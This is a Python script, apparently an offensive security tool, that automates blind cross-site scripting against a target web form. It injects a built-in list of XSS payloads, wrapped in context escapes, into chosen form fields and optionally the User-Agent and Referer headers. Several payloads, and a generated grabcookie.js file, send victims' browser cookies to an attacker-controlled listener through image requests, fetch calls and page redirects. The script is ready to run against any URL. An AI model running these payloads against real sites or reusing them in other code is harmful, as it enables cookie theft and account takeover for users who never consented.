#!/bin/python3

import sys
import os
import requests
import json
import urllib.parse

'''
Checks for HTML forms for blind XSS. 
The script uses a variety of payloads and context escapes. Labels each payload with: 
    - its name, 
    - what escape was used,
    - what field it was inserted into.
Works best with https://github.com/4wayhandshake/simple-http-server
'''

default_payloads = [
    {
        "name": "regularlink",
        "payload": "#HOST#/?#LBL#"
    },
    {
        "name": "htmlanchortag",
        "payload": "<a>#HOST#/?#LBL#</a>"
    },
    {
        "name": "markdownlink",
        "payload": "[link](#HOST#/?#LBL#)"
    },
    {
        "name": "markdownimage",
        "payload": "![alttext](#HOST#/?#LBL#)"
    },
    {
        "name": "append",
        "payload": "<script>document.cookie</script>"
    },
    {
        "name": "newimagesrc",
        "payload": '<script> new Image().src="#HOST#/?#LBL#&b64="+document.cookie; </script>'
    },
    {
        "name": "scriptsrc",
        "payload": "<script src='#HOST#/?#LBL#&b64='+document.cookie></script>"
    },
    {
        "name": "extscript",
        "payload": '<script src="#HOST#/grabcookie.js?#LBL#"></script>'
    },
    {
        "name": "imgonerrorfetchcookie",
        "payload": '<img src=x onerror=\"fetch(\'#HOST#/?#LBL#&b64=\'+document.cookie)\">'
    },
    {
        "name": "imgonerrorfetch",
        "payload": '<img src=x onerror=\"fetch(\'#HOST#/?#LBL#\')\">'
    },
    {
        "name": "scriptdocloc",
        "payload": "<script>document.location='#HOST#/?#LBL#'</script>"
    },
    {
        "name": "imgonerrordocloc",
        "payload": "<img src=x onerror=\"document.location='#HOST#/?#LBL#'\">"
    },
    {
        "name": "scriptdocloccookie",
        "payload": "<script>document.location='#HOST#/?#LBL#&b64='+document.cookie</script>"
    },
    {
        "name": "cssanimation",
        "payload": '<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart="document.location=\'#HOST#/?#LBL#\'"></p>'
    },
    {
        "name": "svganimation",
        "payload": '<svg><animate onbegin="document.location=\'#HOST#/?#LBL#\'" attributeName=x dur=1s>'
    },
    {
        "name": "styleonload",
        "payload": '<style onload="document.location=\'#HOST#/?#LBL#\'"></style>'
    }
]

escapes = {
    'bare': '',
    'singquote':    "'",
    'doubquote':    '"',
    'ket':          '>',
    'ketsingquote': ">'",
    'keydoubquote': '>"'
}

if len(sys.argv) < 4:
    print(f'Usage: {sys.argv[0]} <target_url> <listener> <body> <fields> [-H] [payloads_file]\n'
          f'   ex. {sys.argv[0]} http://target.tld:8080/submitform http://12.34.56.78:8000\n'
          f'   listener should be an attacker-controlled http server\n'
          f'   body should be copy-pasted example of the form POST request body\n'
          f'   fields should be a comma-separated (no spaces) list of fields to target for XSS\n'
          f'   payloads_file should be a json file with the same format as default_payloads in this script\n')
    sys.exit()

# TODO: use argparse instead of sys.argv
# TODO: allow for forms that GET instead of POST
# TODO: add support for anti-CSRF tokens and detection of form fields
# TODO: add support for using a saved request (.raw file)

TARGET = sys.argv[1]
LOCAL = sys.argv[2]
BODY = sys.argv[3]
FIELDS = sys.argv[4]
TRY_HEADERS = True if (len(sys.argv) > 5 and sys.argv[5]) == '-H' else False
PAYLOADS_FILE = sys.argv[6] if len(sys.argv) > 6 else None
DEFAULT_UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'

DEBUG = True
log_http_file = os.path.join(os.getcwd(), 'debug.log')
log_html_file = os.path.join(os.getcwd(), 'debug.html')
log_payloads_file = os.path.join(os.getcwd(), 'debug.lst')
grabcookie_file = os.path.join(os.getcwd(), 'grabcookie.js')

fields = FIELDS.split(',')

grabcookie_javascript_template = r'''
function urlSafeBase64Encode(data) {
  var encoded = btoa(data)
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
  return encoded;
}

new Image().src='#HOST#/grabcookie?b64='+urlSafeBase64Encode(document.cookie)
'''

if PAYLOADS_FILE is None:
    payloads = default_payloads
else:
    try:
        with open(PAYLOADS_FILE, 'r') as f:
            payloads = json.load(f)
    except json.JSONDecodeError as e:
        print(f'Error occurred while parsing JSON:\n{e}\nDefaulting to built-in payloads.')
        payloads = default_payloads
    except FileNotFoundError as e:
        print(f'The specified payloads JSON file was not found:\n{e}\nDefaulting to built-in payloads.')
        payloads = default_payloads
    except IOError as e:
        print(f'An IO error occurred while reading the JSON payloads file:\n{e}. Exiting now.')
        sys.exit(1)


def spinner(idx, message, prescale=0, carriage_rtn='\r'):
    # slow down the spinner by a factor of 2^x, where x is prescale
    state = chr(0x25E2 + ((idx >> prescale) % 4))
    print(f'  {state} {message}{carriage_rtn}', end='', flush=True)


def progress(complete, total):
    perc = 100 * complete / total
    return f'{perc: >6.2f}%'


def substitute_post_body(post_body, fields, payload_template, lbl_prefix):

    # Parse the POST body into a dictionary
    parsed_body = urllib.parse.parse_qs(post_body)
    # Substitute the values of the specified fields
    for field in fields:
        if field in parsed_body:
            _payload = payload_template.replace('#LBL#',lbl_prefix+field.lower())
            #print(f'Appending {field}={parsed_body[field]} with {[_payload]}')
            parsed_body[field] += [_payload]
    # Re-encode the dictionary back into x-www-form-urlencoded format
    return urllib.parse.urlencode(parsed_body, doseq=True)


if __name__ == "__main__":

    i = 0
    N = len(payloads) * len(escapes)

    print(f'\nSubmitting {N} blind XSS payloads to {TARGET}\n')
    
    with open(grabcookie_file,'w') as f:
        print(f'Writing {grabcookie_file} ... be sure to move this to http listener root!')
        f.write(grabcookie_javascript_template.replace('#HOST#', LOCAL))

    if DEBUG:
        print('Debug mode is ENABLED: writing \n - payloads into debug.html \n - HTTP into debug.log \n - raw payloads into debug.lst')
        with open(log_html_file, 'w') as outfile:
            outfile.write(f"<html><body>\n")
        with open(log_http_file, 'w') as logfile:
            logfile.write(f'Logging XSS attempts to {TARGET}\n---------------------------------\n')
        with open(log_payloads_file, 'w') as payloadsfile:
            payloadsfile.write(f"PAYLOADS:\n")
            
    print('   ')

    for p in payloads:
        payload_name = p['name']
        payload_value = p['payload'].replace('#HOST#', LOCAL)

        if DEBUG:
            with open(log_html_file, 'a') as outfile:
                outfile.write(f"<p>{payload_value.replace('#LBL#',f'payload={payload_name}&f=debug')}</p>\n")
            with open(log_payloads_file, 'a') as payloadsfile:
                payloadsfile.write(f"{payload_value.replace('#LBL#',f'payload={payload_name}&f=debug')}\n")

        for e in escapes:
            payload = f'{escapes[e]}{payload_value}'
            status_text = f'{progress(i,N)} submitting payload: {payload_name} with escape: {e}... '
            spinner(i, f'{status_text: <80}', 0, '')
            label = f'payload={payload_name}&escape={e}&field='
            data = substitute_post_body(BODY, fields, payload, label)
            if TRY_HEADERS:
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': payload.replace('#LBL#',label + 'useragent'),
                    'Referer': payload.replace('#LBL#', label + 'referer'),
                }
            else:
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': DEFAULT_UA
                }
            resp = requests.post(
                url=TARGET,
                headers=headers,
                data=data
            )
            if DEBUG:
                with open(log_http_file, 'a') as logfile:
                    logfile.write(f'Request:\n\t{resp.request.url}\n'
                                  f'\t{resp.request.headers}\n'
                                  f'\t{resp.request.body}\n'
                                  f'Response ({resp.status_code}):\n'
                                  f'\t{resp.headers}\n')
            print(f'  {resp.status_code}\r', end='', flush=True)
            i += 1
    print(f'{90*" "}\nDone. Submitted {i} requests')
    if DEBUG:
        with open(log_html_file, 'a') as outfile:
            outfile.write(f"</body></html>")
